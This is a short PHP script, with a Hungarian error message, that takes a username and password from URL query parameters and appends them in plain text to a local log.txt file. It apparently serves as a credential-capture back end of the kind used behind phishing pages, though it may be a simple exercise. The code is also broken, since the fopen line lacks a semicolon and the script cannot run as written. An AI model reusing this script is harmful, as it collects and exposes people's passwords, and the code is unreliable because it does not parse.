<?php
    if (isset($_GET["userName"]) && isset($_GET["password"])){
        $user_name=$_GET["userName"];
        $user_passwd=$_GET["password"];
    } else {
        die("Nem érkezett meg az adat");
    }
    
    $message=["userName" => $user_name, "password" => $user_passwd];
    //echo json_encode($message);
    $handle = fopen("./log.txt", "a")
    fwrite($handle, json_encode($message));
    fclose($handle);
?>